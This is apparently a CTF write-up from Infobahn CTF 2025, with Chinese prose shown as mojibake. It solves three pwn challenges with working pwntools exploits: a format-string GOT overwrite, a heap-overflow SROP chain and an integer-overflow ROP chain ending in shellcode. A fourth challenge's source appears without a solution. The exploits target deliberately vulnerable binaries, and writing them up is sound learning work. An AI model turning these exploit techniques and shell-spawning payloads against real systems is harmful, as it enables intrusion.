# 2025-11-08-Infobahn-CTF-2025

â€

```py
https://ctftime.org/event/2883
```

â€

## pwnset

â€

æ•´ä½“çœ‹äº†ä¸€ä¸‹ chal ,æ„Ÿè§‰æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè¾“å…¥çš„ username å’Œ age ä¼ åˆ° äº† log 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-414h] BYREF
  int stat_loc; // [rsp+10h] [rbp-410h] BYREF
  __pid_t pid; // [rsp+14h] [rbp-40Ch]
  __int64 num_age; // [rsp+18h] [rbp-408h] BYREF
  char str_age[16]; // [rsp+20h] [rbp-400h] BYREF
  char username[1000]; // [rsp+30h] [rbp-3F0h] BYREF
  unsigned __int64 v10; // [rsp+418h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("Select your options:");
        puts("1. register username");
        puts("2. get age");
        puts("3. exit");
        printf("> ");
        if ( (unsigned int)__isoc99_scanf("%d", &v4) != 1 )
          return 0;
        if ( v4 != 1 )
          break;
        printf("Enter your username: ");
        if ( (unsigned int)__isoc99_scanf("%999s", username) != 1 )
          return 0;
        printf("Enter your age: ");
        if ( (unsigned int)__isoc99_scanf("%15s", str_age) != 1 )
          return 0;
        if ( (unsigned int)parse_age(str_age, &num_age) )
        {
          puts("Invalid age");
        }
        else
        {
          if ( (unsigned int)age_exists(num_age) )
            puts("A user already has this age");
          pid = fork();
          if ( pid == -1 )
          {
            perror("fork");
            return 1;
          }
          if ( !pid )
          {
            execl("./log", "log", "-u", username, "-a", str_age, 0);
            perror("execl");
            _exit(1);
          }
          waitpid(pid, &stat_loc, 0);
          add_user(username, num_age);
        }
      }
      if ( v4 != 2 )
        break;
      printf("Enter username to look up: ");
      if ( (unsigned int)__isoc99_scanf("%999s", username) != 1 )
        return 0;
      if ( (unsigned int)find_age_by_username(username, (size_t *)&num_age) )
        printf("No age found for %s\n", username);
      else
        printf("%s is %lld years old\n", username, num_age);
    }
    if ( v4 == 3 )
      break;
    puts("Invalid choice");
  }
  return 0;
}
```

åˆ†æä¸€ä¸‹log ç¨‹åºï¼Œæœç„¶é—®é¢˜å‡ºåœ¨è¿™ï¼Œ syslog ç¬¬äºŒä¸ªå‚æ•°æ˜¯`fmt`, è¿™é‡Œä¹Ÿæ˜¯å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ

ä¸€æ¬¡é stack ä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´

![image](assets/image-20251110102222-5p8xz70.png)

è¿™é‡Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ä¿®æ”¹ `free@got`â€‹ ä¸º `system`â€‹ï¼Œä½†æ˜¯ç”±äº`free@got` é«˜4å­—èŠ‚æ˜¯ç©ºçš„ï¼Œä¸å¥½æ“ä½œ

![image](assets/image-20251110102626-z6g1j8y.png)

![image](assets/image-20251110102703-zdbshgg.png)

å¦ä¸€ç§æ–¹æ³•

ä»”ç»†è§‚å¯Ÿ å¯ä»¥å‘ç°è²Œä¼¼åªæœ‰ `strtouq` çš„åœ°å€é™¤äº†å‰2ä¸ªå­—èŠ‚éƒ½æ˜¯å’Œ systemåœ°å€ä¸€æ ·çš„ï¼Œè¿™æ ·çš„è¯å¯ä»¥åˆ©ç”¨

â€‹`hn`â€‹ ä¿®æ”¹ `strtoull@got`â€‹ ä¸º system,ç„¶å ä¿®æ”¹`free@got`â€‹ ä¸º `strtoull@plt`

![image](assets/image-20251110103213-p0pmobs.png)

> ç”±äº å‰ 12 ä½æ˜¯å·²çŸ¥çš„ï¼Œåªéœ€è¦ çˆ†ç ´ å4ä½ ï¼ˆ1/16æ¦‚ç‡ï¼‰å³å¯ ï¼ˆä¸çŸ¥é“ä¸ºå•¥ä¸€å¼€å§‹æƒ³åˆ° çˆ†ç ´ã€‚ï¼‰

ä½†æ˜¯è¿˜æœ‰ç§æ–¹æ³• é€šè¿‡ `%*xx$lu`â€‹ å– `__libc_start_main`â€‹ çš„åœ°å€ï¼Œ ç„¶å  + ä¸€ä¸ª `offadd`â€‹ (offaddæ˜¯ `__libc_start_main`â€‹ å’Œ `system`) çš„åç§»ï¼‰ï¼Œå°±å¯ä»¥æˆåŠŸå¾—åˆ° å‡†ç¡®çš„ systemåœ°å€çš„ å‰2ä¸ªå­—èŠ‚ï¼Œ

ç„¶å å†™å…¥ `strtoull@got`, 

![image](assets/image-20251110104135-bv1f12m.png)

![image](assets/image-20251110104212-uiah202.png)

â€

```py
offadd = 0x2e4c5
target2 = 0x401204
pay = '\';/bin/sh;#'.ljust(0x20-13,';')
pay += f'%{0x10000 - 0x20 + (target2&0xffff)}c%{5+0x11}$hn'
pay += f'%*{5+0xA3}$lu%{0x10000 - (target2&0xffff) + offadd}c%{5+0x89}$hn'
pay += 'A' * (8 - (len(pay)%8))
pay += '\x58\x34\x40'
age = 0x4034a8

cmd = f'./log -u {pay} -a {age}'
```

â€

![image](assets/image-20251110104554-tqkavkh.png)

â€

â€

## Book Manager V2

FPC å•¥ï¼Ÿ

![image](assets/image-20251110105730-e01sg2b.png)

CREATEBOOK å­˜åœ¨å †æº¢å‡º

![image](assets/image-20251110104910-dbtqux6.png)

å¯ä»¥å †æº¢å‡ºè¦†ç›–ä¸‹é¢çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œä¸ªäººçŒœæµ‹è¿™å¯èƒ½æ˜¯ç±»ä¼¼  glibc `tcachebins` çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œå°è¯•è¦†ç›–ä¸º ç¨‹åºçš„bss

![image](assets/image-20251110105058-dq9l8kw.png)

ä¸å‡ºæ‰€æ–™ï¼Œæœç„¶ç”³è¯·åˆ°äº†ï¼Œåé¢çš„æ­¥éª¤å°±ç®€å•äº†ï¼Œç”³è¯·åˆ° `BOOKPTRS` ç„¶åæ§åˆ¶ å †æŒ‡é’ˆå°±å¯ä»¥ä»»æ„è¯» ä»»æ„å†™äº†

![image](assets/image-20251110105459-h053jh9.png)

```py
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = 'book-managerv2.challs.infobahnc.tf 1337'.replace(' ',':')
binary = './chall'

def start(argv=[], *a, **kw):
    if args.GDB:return gdb.debug(binary,gdbscript)
    if args.TAG:return remote(*args.TAG.split(':'),ssl=True)
    if args.REM:return remote(*attack.split(':'))
    return process([binary] + argv, *a, **kw)


#context(arch='amd64', log_level = 'debug')
context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))
#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
import socks
context.proxy = (socks.SOCKS5, '192.168.64.1', 10808)
gdbscript = '''
b *0x401211
b *0x4019DF
b *0x0401300
#continue
'''.format(**locals())
#import os
#os.systimport os
#io = remote(*attack.split(':'))
io = start([])


def add(title,author):
    ru(': ')
    sl('1')
    ru(': ')
    sl(title)
    ru(': ')
    sl(author)

def show():
    ru(': ')
    sl('2')

def edit(idx,title,author='a'):
    ru(': ')
    sl('3')
    ru(': ')
    sl(str(idx))
    ru(': ')
    sl(title)
    ru(': ')
    sl(author)

def rm(idx):
    ru(': ')
    sl('4')
    ru(': ')
    sl(str(idx))

#pay = flat({
#},filler=b'\x00')

#00:0000â”‚     0x7dc0e52e3040 â—‚â€” '11111111111111111111111111111111AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#... â†“     3 skipped
#04:0020â”‚     0x7dc0e52e3060 â—‚â€” 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#... â†“     3 skipped
#pwndbg> 
#08:0040â”‚     0x7dc0e52e3080 â—‚â€” 'AAAAAAAAAAAAAAAA'
#09:0048â”‚     0x7dc0e52e3088 â—‚â€” 'AAAAAAAA'
#0a:0050â”‚     0x7dc0e52e3090 â—‚â€” 0
#0b:0058â”‚     0x7dc0e52e3098 â—‚â€” 0x98061
#0c:0060â”‚     0x7dc0e52e30a0 â€”â–¸ 0x7dc0e52e30f8 â—‚â€” 0xf8061
#0d:0068â”‚     0x7dc0e52e30a8 â—‚â€” 0
pay  = b'A' * 0x30
pay += p64(0) + p64(0x98061)
pay += p64(0x47E540-0x10)
add('1'*0x30,pay)
#add('2'*0x30,'B'*0x30)

add('1'*0x30,'A'*0x30)
#pause()
pay = p64(0x464040) * 3
#gdb.attach(io,gdbscript=gdbscript)
add(pay,'C')
show()
ru('0: "')
stack = uu64(r(6))
lss('stack')
pay = p64(stack-0x40) * 2
edit(2,pay)


syscall = 0x4021C8
rax = 0x0000000000413ef3 # pop rax ; ret

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack -0x40+0x98
sigframe.rsi = 0
sigframe.rbx = u64(b'/bin/sh\x00')
sigframe.rdx = 0
sigframe.rsp = 0x464000
sigframe.rip = syscall


pay  = p64(rax) + p64(0xf)
pay += p64(syscall)
pay += bytes(sigframe)
edit(0,pay)

itr()
```

â€

â€

## pwn a brainrot

â€

```py
import fmt
import fs
import libc
import strings

[u32] user_inventory = []

map<string,int> brainrot_map = {
    'Meowl': 1,
    'Ballerina Cappuccina': 10,
    'John Pork': 100,
    'Job Job Job Sahur': 1000,
    'Odin Din Din Dun': 10000,
    'Orcalero Orcala': 100000,
    'Chimpanzini Bananini': 1000000,
    'Los 67': 67676767,
}

var stdin = fs.stdin()

fn read_string(i64 max_size):string! {
    var buffer = vec_new<u8>(0, max_size)
    stdin.read(buffer)
    var result = buffer as string
    if result.find('\n') != -1 {
        result[result.find('\n')] = 0
    }
    return result
}

fn read_int():i64! {
    return libc.strtol(read_string(24).to_cstr(), 0, 0)
}

fn print_brainrots() {
    fmt.printf('\n=== Brainrots ===\n')
    for k, v in brainrot_map {
        fmt.printf('%s ($%d/s)\n', k, v)
    }
    fmt.printf('\n')
}

fn print_menu() {
    fmt.printf('\n=== Steal a Brainrot Terminal ===\n')
    fmt.printf('1. Steal a brainrot\n')
    fmt.printf('2. Check brainrot income\n')
    fmt.printf('3. Exit\n')
    fmt.printf('> ')
}

fn steal():void! {
    fmt.printf('Brainrot index: ')
    var idx = read_int()
    
    if idx < 0 || idx >= user_inventory.len() {
        fmt.printf('aaaaaaaaaaaaaaaaaaaaaaaa\n')
        return
    }
    
    print_brainrots()
    fmt.printf('Which brainrot are you stealing?: ')
    var to_steal = read_string(48)

    if !brainrot_map.contains(to_steal) {
        fmt.printf('u pmo sb icl\n')
        return
    }
    
    var income = brainrot_map[to_steal] as u32
    user_inventory[idx] += income
    fmt.printf('Added $%d/s of income to brainrot %d\n', income, idx)
}

fn check_income():void! {    
    fmt.printf('Brainrot index: ')
    var idx = read_int()
    
    if idx < 0 || idx >= user_inventory.len() {
        fmt.printf('nuh uh\n')
        return
    }
    
    fmt.printf('Brainrot %d is generating $%d/s\n', idx, user_inventory[idx])
}

fn main():void! {
    fmt.printf('=== Steal a Brainrot ===\n')
    fmt.printf('How large is your inventory? ')
    
    var count = read_int()
    
    if count < 0 {
        fmt.printf('r u fr...\n')
        return
    }

    if count == 0 {
        fmt.printf('js say u hate me gng ğŸ’”\n')
        return
    }
    
    user_inventory = vec_new<u32>(0, count)
    fmt.printf('Created room for %d brainrots\n', user_inventory.len())
    
    for true {
        print_menu()
        var choice = read_int()
        
        if choice == 1 {
            steal()
        } else if choice == 2 {
            check_income()
        } else if choice == 3 {
            fmt.printf('Goodbye\n')
            break
        } else {
            fmt.printf('What are you doing ğŸ˜­ğŸ˜­ğŸ˜­\n')
        }
    }
}

```

â€

æ­£å¸¸çš„æƒ…å†µä¸‹, ç”³è¯· ä¸€ä¸ª è¿™ä¹ˆå¤§çš„ `int[count]` ä¸€ä¸ªæ•°æ®å—

```py
user_inventory = vec_new<u32>(0, count)
```

  

â€‹`steal()`â€‹ å¯ä»¥ä¸º `int[count]` æŸä¸€ä¸ªindex çš„æ•°æ® + 1 10 1000 ... ç­‰ç­‰

```py
map<string,int> brainrot_map = {
    'Meowl': 1,
    'Ballerina Cappuccina': 10,
    'John Pork': 100,
    'Job Job Job Sahur': 1000,
    'Odin Din Din Dun': 10000,
    'Orcalero Orcala': 100000,
    'Chimpanzini Bananini': 1000000,
    'Los 67': 67676767,
}
```

â€‹`check_income()`â€‹ å°±æ˜¯æŸ¥çœ‹ `int[count]`æŸä¸€ä¸ªindex çš„å€¼

â€

çœ‹ä¼¼ä¸Šé¢çš„åŠŸèƒ½æ²¡æœ‰ä¸Šé¢é—®é¢˜ï¼Œå®åˆ™é—®é¢˜å‡ºåœ¨ `vec_new<u32>(0, count)`

![image](assets/image-20251110110712-2rpa66k.png)

![image](assets/image-20251110110732-blbo0j7.png)

- rt_vec_new()ï¼Œè¿™é‡Œæœ‰ä¸ª * 4 çš„æ“ä½œï¼Œåˆ©ç”¨æ•´æ•°æº¢å‡º å¯ä»¥ä½¿ ç”³è¯·çš„å †å—å˜å°

![image](assets/image-20251110110928-05m4dos.png)

â€

è°ƒè¯•çœ‹ä¸€ä¸‹ è¾“å…¥æ„é€ çš„å¤§ size ç„¶å * 4 å å˜æˆ 0x40

![image](assets/image-20251110111303-uq96ob4.png)

![image](assets/image-20251110111315-bsgboso.png)

![image](assets/image-20251110111337-trl3aai.png)

ç”³è¯·çš„æ˜¯ 0x40 ä½†æ˜¯å®é™…ä¸Š æˆ‘ä»¬å¯ä»¥æ§åˆ¶ idx<=`0x4000000000000010`,åªè¦çŸ¥é“åç§»å°±å¯ä»¥ä»»æ„åœ°å€ä¿®æ”¹

![image](assets/image-20251110111512-2b5wkgf.png)

æœ¬æ¥æƒ³ç›´æ¥ä¿®æ”¹stack ä¸Šè¿”å›åœ°å€çš„ï¼Œå°´å°¬çš„æ˜¯ stack åœ¨ `0xa000000000+xxx`â€‹ æ¯”`0xc000000040`å †åœ°å€è¦ä½ï¼Œæ²¡æ³•ä¿®æ”¹ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ æ­£ç´¢å¼•ï¼Œæ²¡æ³•æ§åˆ¶è´Ÿç´¢å¼•ï¼Œ

![image](assets/image-20251110112416-82xbkw0.png)

ä¸è¿‡å¹¸è¿çš„æ˜¯æˆ‘å‘ç°äº† æ¯æ¬¡è‡ªå¢çš„æ•°å€¼ ï¼Œå®ƒä¹Ÿåœ¨å †ä¸Š

![image](assets/image-20251110112634-rys81i7.png)

æå‰æ„é€ å¥½ä¸€ä¸ªå€¼ ç„¶åè®© æŒ‡é’ˆçš„é«˜ä½ 0xc0  åŠ ä¸Šå å˜æ›´æˆ 0xa0 æˆ–æ›´å° å°±å¯ä»¥ä¿®æ”¹ stack äº†

![image](assets/image-20251111163726-e5o4bn9.png)

æœ‰æ€è·¯äº†å°±å†™exp

```py
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = 'brainrot.challs.infobahnc.tf 1337'.replace(' ',':')
binary = './brainrot'

def start(argv=[], *a, **kw):
    if args.GDB:return gdb.debug(binary,gdbscript)
    if args.TAG:return remote(*args.TAG.split(':'),ssl=True)
    if args.REM:return remote(*attack.split(':'))
    return process([binary] + argv, *a, **kw)


#context(arch='amd64', log_level = 'debug')
context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))
#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
import socks
context.proxy = (socks.SOCKS5, '192.168.31.15', 10808)
gdbscript = '''
b *0x00619363
b *0x61A098
#c
'''.format(**locals())
#import os
#os.systimport os
#io = remote(*attack.split(':'))
io = start([])


l = {
    'Meowl': 1,
    'Ballerina Cappuccina': 10,
    'John Pork': 100,
    'Job Job Job Sahur': 1000,
    'Odin Din Din Dun': 10000,
    'Orcalero Orcala': 100000,
    'Chimpanzini Bananini': 1000000,
    'Los 67': 67676767,
    }
k = list(l.keys())

base = 0xc000000040

def cy(addr):
    idx = (addr - base) // 4
    return idx


def add32(addr,num):
    idx = cy(addr)
    ru('> ')
    sl('1')
    ru(': ')
    sl(str(idx))
    ru(': ')
    sl(num)

def read32(addr):
    idx = cy(addr)
    ru('> ')
    sl('2')
    ru(': ')
    sl(str(idx))
    ru('generating $')
    data = int(ru('/')[:-1].decode())
    print(data)
    return data




ru('How large is your inventory? ')
size = (0x10000000000000000 + 0x40) // 4
sl(str(size))

# 
#def write64(addr, dest, src):
#    if addr < 0xc00000c1e0:
#        return
#    idx = (addr - 0xc00000c1e0) // 4
#    target = dest - src
#    if target > 0:
#        if (target > 67676767):
#            for i in range(target // 67676767):
#                print(i, idx)
#                steal(idx, b"Los 67")
#                # io.interactive()
#            target = target % 67676767
#        if (target > 1000000):
#            for i in range(target // 1000000):
#                print(i, idx)
#                steal(idx, b"Chimpanzini Bananini")
#            target = target % 1000000
#        if (target > 100000):
#            for i in range(target // 100000):
#                print(i, idx)
#                steal(idx, b"Orcalero Orcala")
#            target = target % 100000
#        if (target > 10000):
#            for i in range(target // 10000):
#                print(i, idx)
#                steal(idx, b"Odin Din Din Dun")
#            target = target % 10000
#        if (target > 1000):
#            for i in range(target // 1000):
#                print(i, idx)
#                steal(idx, b"Job Job Job Sahur")
#            target = target % 1000
#        if (target > 100):
#            for i in range(target // 100):
#                print(i, idx)
#                steal(idx, b"John Pork")
#            target = target % 100
#        if (target > 10):
#            for i in range(target // 10):
#                print(i, idx)
#                steal(idx, b"Ballerina Cappuccina")
#            target = target % 10
#        if (target >= 1):
#            for i in range(target // 1):
#                print(i, idx)
#                steal(idx, b"Meowl")
#            target = target % 1


sd = [1,0,100,1000,10000,100000,1000000,67676767][::-1]
def rrw(addr, dst):
    if dst == 0:
        return
    src = read32(addr)
    target = dst - src
    while(target):
        for i in range(len(sd)):
            if(target > sd[i] and sd[i]!=0):
                for j in range(target // sd[i]):
                    add32(addr,k[::-1][i])
                target %= sd[i]


read32(0xc0000000e0)


rrw(0xc000008088,0xffffffe0)


add32(0xc000002e14,k[1])

base = 0xa000000040

#add32(0xc000002e10,k[1])
x = [0xa000200fa8, 0xa000401fa8, 0xa000602fa8, ]
t1 = 0x630611

stack = 0
for i in x:
    if (read32(i) == t1):
        stack = i
        break
lss('stack')
#rrw(0xc000002e10,0x100)

#rsp = 0x000000000062a270 # pop rsp ; ret

rop_base = 0xc000008100 - 8
rsp = 0x0000000000647739# pop rsp; pop r13; ret
rsp = 0x0000000000647a59
rdi = 0x0000000000634cb7
rsi = 0x000000000064a120
rdx = 0x0000000000662b1a
syscall = 0x0000000000661ba0
rrw(stack,rsp)


rrw(stack+8,rop_base & 0xFFFFFFFF)
rrw(stack+0xC,0xc0)
rrw(rop_base+0x18+0x30, syscall)
rrw(rop_base+0x18+0x28, 1000)
rrw(rop_base+0x18+0x20, rdx)
rrw(rop_base+0x18+0x1C, 0xC0)
rrw(rop_base+0x18+0x18, 0x8148)
rrw(rop_base+0x18+0x10, rsi)
rrw(rop_base+0x18, rdi)

#gdb.attach(io,gdbscript=gdbscript)
ru('> ')
sl('3')
rax = 0x0000000000662865
sleep(0.1)
rop  = p64(rax) + p64(0xa)
rop += p64(rdi) + p64(0xc000008000)
rop += p64(rsi) + p64(0x1000)
rop += p64(rdx) + p64(7)
rop += p64(syscall)
rop += p64(0xc000008200)
rop += b'\x90' * 0x100
rop += asm(shellcraft.sh())
#pause()
sl(rop)

sleep(0.1)
sl('id;cat /flag*')

itr()

```

â€

![image](assets/image-20251110183810-isnw32t.png)

â€

## quintuple-read

ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜… 

```python
from secrets import token_bytes
from functools import reduce
import subprocess
import tempfile
import os

FLAG = b'infobahn{this_is_a_test_flag}'
FLAGS_COUNT = 5

def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

flags = []
for i in range(FLAGS_COUNT - 1):
    flags.append(token_bytes(len(FLAG)))
flags.append(xor(reduce(xor, flags), FLAG))
assert reduce(xor, flags) == FLAG

blacklist = set()
for i, flag in enumerate(flags):
    with tempfile.TemporaryDirectory() as temp_dir:
        flag_path = os.path.join(temp_dir, 'flag.txt')
        with open(flag_path, 'wb') as f:
            f.write(flag)

        os.chmod(temp_dir, 0o755)
        os.chmod(flag_path, 0o644)

        try:
            user_input = bytes.fromhex(input(f"Enter your input as hex ({i+1}/{FLAGS_COUNT}):").strip())
            for byte in user_input:
                if byte in blacklist:
                    print("You already used " + hex(byte))
                    exit()
            blacklist = blacklist.union(set(user_input))

            p = subprocess.run(
                ['sudo', '-u', 'restricted', '/binary'],
                capture_output=True,
                input=user_input,
                timeout=2.0,
                cwd=temp_dir
            )

            print("stdout:", p.stdout)
        except Exception as e:
            print("Error:", e)
            exit()
```

â€
